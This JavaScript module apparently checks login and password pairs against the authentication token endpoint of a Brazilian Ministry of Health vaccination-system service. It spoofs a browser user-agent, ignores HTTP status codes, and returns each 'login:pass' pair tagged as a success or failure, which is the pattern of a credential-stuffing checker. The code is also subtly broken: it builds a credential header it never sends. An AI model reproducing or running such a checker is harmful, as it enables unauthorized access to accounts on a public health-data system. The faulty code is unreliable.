import axios from "axios";
import https from 'https'
import request from '../core/configs.js'

export default async function siPni(login, pass) {

  const url = 'https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso'

  const credentiasEncoded = btoa(`${login}:${pass}`);

  const headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    'x-authorization': 'Basic '+credentiasEncoded,
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
  };

  const { data } = await axios({
    method: "POST",
    headers: request.headers,
    url: url,
    validateStatus: () => true
  });

  if (!data?.accessToken)
    return {
      success: false,
      login: login + ":" + pass,
      uri: url,
    };
  return {
    success: true,
    login: login + ":" + pass,
    uri: url,
  };
}


